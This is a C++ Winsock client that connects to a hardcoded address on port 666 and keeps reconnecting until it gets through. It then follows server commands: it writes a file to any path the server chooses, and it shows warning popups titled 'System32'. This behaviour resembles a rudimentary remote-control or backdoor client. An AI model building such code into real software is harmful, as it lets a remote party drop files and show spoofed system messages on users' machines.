//Client v 2.0
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <string>
#include <iostream>
#include <winsock2.h>
#include <windows.h>

#define PORT 666
#define SERVERADDR "192.168.1.69"
#pragma comment(lib,"Ws2_32.lib")

using namespace std;

int main(int argc, char* argv[])
{
	setlocale(LC_ALL,"rus");
	char buff[1024];
	for (int i = 0; i < sizeof(buff) / sizeof(char); i++) {
		buff[i] = '\0';
	}
	printf("TCP DEMO CLIENT\n");


	if (WSAStartup(0x202, (WSADATA *)&buff[0]))
	{
		printf("WSAStart error %d\n", WSAGetLastError());
		return -1;
	}

	SOCKET my_sock;
	my_sock = socket(AF_INET, SOCK_STREAM, 0);
	if (my_sock < 0)
	{
		printf("Socket() error %d\n", WSAGetLastError());
		system("pause");
		return -1;
	}

	sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(PORT);
	HOSTENT *hst;


	if (inet_addr(SERVERADDR) != INADDR_NONE)
		dest_addr.sin_addr.s_addr = inet_addr(SERVERADDR);
	else
	{

		if (hst = gethostbyname(SERVERADDR))

			((unsigned long *)&dest_addr.sin_addr)[0] =
			((unsigned long **)hst->h_addr_list)[0][0];
		else
		{
			printf("Invalid address %s\n", SERVERADDR);
			closesocket(my_sock);
			WSACleanup();
			system("pause");
			return -1;
		}
	}

	if (connect(my_sock, (sockaddr *)&dest_addr, sizeof(dest_addr)))
	{
		printf("Connect error %d\n", WSAGetLastError());
		while (connect(my_sock, (sockaddr *)&dest_addr, sizeof(dest_addr))) {
			Sleep(5000);
			if (!(connect(my_sock, (sockaddr *)&dest_addr, sizeof(dest_addr))))break;
		}
	}

	printf("Soedinenie s %s uspeshno ustanovlenno\n \
            Type quit for quit\n\n", SERVERADDR);


	int nsize;
	while ((nsize = recv(my_sock, &buff[0], sizeof(buff) - 1, 0)) != SOCKET_ERROR)
	{

		buff[nsize] = 0;

		printf("Server => Client:%s", buff);

			if((buff[0]=='-')&&(buff[1]=='-')&&(buff[2] == 's')) {
				std::cout << "Принимаю файл\n";
			HANDLE hFile;
			std::string result = buff + 4;
			hFile = CreateFile(result.c_str(),  // имя файла
				GENERIC_WRITE,
				0,
				NULL,
				OPEN_ALWAYS,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
			DWORD dwBytesWritten;
			while (1) {
				char buff[1028] = "";
				int nbytes = recv(my_sock, buff, sizeof(buff), 0);
				std::cout << buff << std::endl;
				WriteFile(hFile, buff, nbytes, &dwBytesWritten, NULL);
				if (nbytes == 0) {
					std::cout << "file downloaded\n";
					break;
				}
				if (nbytes < 0)
				{
					std::cout << "Error: " << WSAGetLastError() << std::endl;
					break;
				}
			}
			std::cout << "Можно выходить\n";
			CloseHandle(hFile);
		}
		else if((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'm')){
			std::string result = buff + 4;
			std::cout << MessageBox(NULL, result.c_str(), "System32", MB_OK | MB_ICONWARNING);
		}
	}
	printf("Recv error %d\n", WSAGetLastError());
	closesocket(my_sock);
	WSACleanup();
	system("pause");
	return -1;
}
